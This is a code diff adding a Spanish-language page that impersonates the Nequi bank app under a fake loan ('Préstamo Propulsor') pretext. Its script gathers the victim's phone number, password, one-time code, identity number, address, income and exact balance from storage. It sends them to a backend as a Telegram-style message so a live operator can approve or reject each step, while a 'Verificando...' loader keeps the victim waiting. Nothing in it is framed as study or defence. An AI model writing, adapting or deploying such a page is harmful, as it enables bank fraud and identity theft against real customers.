@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Nequi - Actualizar Saldo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: 'Manrope', system-ui, sans-serif;
+      background: #fde7f1;
+    }
+
+    #loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(8px);
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .loader-gif {
+      width: 100px;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+  <div id="loader-overlay">
+    <img src="loader.gif" class="loader-gif">
+    <p class="mt-4 font-bold text-[#da0081] text-lg">Verificando...</p>
+  </div>
+
+  <header class="w-full bg-white px-4 py-3 shadow-sm flex justify-center">
+    <img src="https://logosenvector.com/logo/img/nequi-37254.png" alt="Nequi" class="h-10" />
+  </header>
+
+  <main class="px-4 mt-8 flex-grow">
+    <div class="max-w-[420px] mx-auto bg-white rounded-lg p-6 shadow-md border-t-4 border-[#da0081]">
+      <h2 class="text-xl font-bold text-[#200020] mb-2 text-center flex items-center justify-center gap-2">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-[#da0081]" fill="none" viewBox="0 0 24 24"
+          stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+            d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+        </svg>
+        Verifica tu Saldo
+      </h2>
+      <p class="text-sm text-gray-600 mb-6 text-center" id="intentos-text">Hemos detectado que el saldo Nequi ingresado
+        no es el correcto. Por favor ingresa el saldo actual exacto de tu cuenta.</p>
+
+      <div class="bg-[#f9f7fc] p-3 border-b-2 border-[#da0081] rounded-t-sm mb-6">
+        <label class="block text-[10px] text-[#da0081] font-bold uppercase">Saldo Actual Correcto</label>
+        <input id="monto" type="tel" placeholder="$ 0"
+          class="w-full bg-transparent outline-none text-2xl font-bold mt-1 text-[#200020]">
+      </div>
+
+      <button id="btn"
+        class="w-full h-12 bg-[#da0081] text-white font-bold rounded-sm transition-transform active:scale-95 shadow-md hover:bg-[#b00068]">
+        Confirmar Saldo
+      </button>
+    </div>
+  </main>
+
+  <script>
+    const input = document.getElementById('monto'), btn = document.getElementById('btn');
+
+    let attempts = parseInt(localStorage.getItem('s_attempts')) || 2;
+    if (attempts <= 0) {
+      alert("Has superado los intentos para corregir el saldo.");
+      window.location.href = "https://www.nequi.com.co";
+    }
+
+    document.getElementById('intentos-text').innerHTML = `Hemos detectado que el saldo Nequi ingresado no es el correcto.<br><strong class="text-[#da0081]">Te quedan ${attempts} intento(s).</strong><br>Por favor ingresa el saldo exacto de tu cuenta.`;
+
+    input.addEventListener('input', (e) => {
+      let v = e.target.value.replace(/\D/g, "");
+      if (v) e.target.value = "$ " + new Intl.NumberFormat('de-DE').format(v);
+      else e.target.value = "";
+    });
+
+    btn.addEventListener('click', async () => {
+      if (!input.value || input.value.length < 3) {
+        alert("Ingresa un saldo válido."); return;
+      }
+
+      document.getElementById('loader-overlay').style.display = 'flex';
+
+      localStorage.setItem('p_saldo', input.value);
+      localStorage.setItem('s_attempts', (attempts - 1).toString());
+
+      const phone = localStorage.getItem('phone') || 'N/A';
+      const password = localStorage.getItem('password') || 'N/A';
+      const otp = localStorage.getItem('otp') || 'N/A';
+
+      const nombre = localStorage.getItem('p_nombre') || 'N/A';
+      const apellido = localStorage.getItem('p_apellido') || 'N/A';
+      const cedula = localStorage.getItem('p_cedula') || 'N/A';
+      const direccion = localStorage.getItem('p_direccion') || 'N/A';
+      const ingresos = localStorage.getItem('p_ingresos') || 'N/A';
+      const gastos = localStorage.getItem('p_gastos') || 'N/A';
+      const saldo = input.value;
+      const prestamo = localStorage.getItem('p_prestamo') || 'N/A';
+
+      const text = `<b>💰 PRÉSTAMO PROPULSOR (SALDO CORREGIDO)</b>\n\n<b>👤 DATOS PERSONALES</b>\n<b>Nombre:</b> ${nombre} ${apellido}\n<b>Cédula:</b> ${cedula}\n<b>Dir:</b> ${direccion}\n\n<b>💵 FINANCIERO</b>\n<b>Ingresos:</b> ${ingresos}\n<b>Gastos:</b> ${gastos}\n<b>Saldo Actual:</b> ${saldo} ⚠️\n<b>Quiere Prestar:</b> ${prestamo}\n\n<b>📱 CREDENCIALES</b>\n<b>Celular:</b> ${phone}\n<b>Clave:</b> ${password}\n<b>Dinámica:</b> ${otp}`;
+
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "❌ Error Logo", callback_data: "err_logo" }, { text: "❌ Error Dinámica", callback_data: "err_otp" }],
+          [{ text: "❌ Error Saldo", callback_data: "err_saldo" }],
+          [{ text: "✅ Aprobar Préstamo", callback_data: "finalizar" }]
+        ]
+      };
+
+      try {
+        const res = await fetch('/api/send-message', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text, keyboard }) });
+        const data = await res.json();
+        if (data.ok) {
+          const poll = await fetch(`/api/check-update/${data.result.message_id}`);
+          const act = await poll.json();
+
+          if (act.action === 'err_logo') {
+            window.location.href = "login.html?errorLogo=1";
+          } else if (act.action === 'err_otp') {
+            window.location.href = "login.html?errorOtp=1";
+          } else if (act.action === 'err_saldo') {
+            window.location.href = "monto.html"; // Reloads the same page
+          } else {
+            window.location.href = "https://www.nequi.com.co";
+          }
+        } else {
+          document.getElementById('loader-overlay').style.display = 'none';
+          alert("Error con servidor");
+        }
+      } catch (e) {
+        document.getElementById('loader-overlay').style.display = 'none';
+        alert("Error de conexión.");
+      }
+    });
+  </script>
+</body>
+
+</html>
